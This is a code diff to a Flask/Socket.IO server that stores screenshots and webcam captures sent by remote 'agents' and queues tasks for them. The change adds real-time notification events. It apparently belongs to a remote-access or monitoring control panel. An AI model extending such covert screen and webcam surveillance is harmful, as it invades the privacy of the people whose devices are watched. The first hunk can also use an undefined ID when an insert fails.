@@ -671,8 +671,21 @@ def init_api_routes(app, socketio):
                              (None, data['agent_id'],
                               image_data,
                               datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
+                    
+                    # Get the inserted screenshot ID
+                    screenshot_id = c.lastrowid
                 except Exception as e:
                     app.logger.error(f"Error storing screenshot: {str(e)}")
+                
+                # Emit new_screenshot event after successful insert
+                try:
+                    socketio.emit('new_screenshot', {
+                        'agent_id': data['agent_id'],
+                        'screenshot_id': screenshot_id,
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                    })
+                except Exception as e:
+                    app.logger.error(f"Error emitting new_screenshot event: {str(e)}")
 
             c.execute('''SELECT id, task_type, task_data FROM tasks 
                          WHERE agent_id=? AND status='pending'
@@ -1063,7 +1076,15 @@ def init_api_routes(app, socketio):
                                 VALUES (?, ?, ?, ?)''',
                             (None, data['agent_id'],
                             image_data,
-                            datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
+                            datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
+                    screenshot_id = c.lastrowid
+                    
+                    # Emit new_screenshot event
+                    socketio.emit('new_screenshot', {
+                        'agent_id': data['agent_id'],
+                        'screenshot_id': screenshot_id,
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                    })
                 except Exception as e:
                     app.logger.error(f"Error storing screenshot: {str(e)}")
 
@@ -1075,7 +1096,15 @@ def init_api_routes(app, socketio):
                                 VALUES (?, ?, ?, ?)''',
                             (None, data['agent_id'],
                             image_data,
-                            datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
+                            datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
+                    capture_id = c.lastrowid
+                    
+                    # Emit new_webcam event
+                    socketio.emit('new_webcam', {
+                        'agent_id': data['agent_id'],
+                        'capture_id': capture_id,
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                    })
                 except Exception as e:
                     app.logger.error(f"Error storing webcam image: {str(e)}")
 
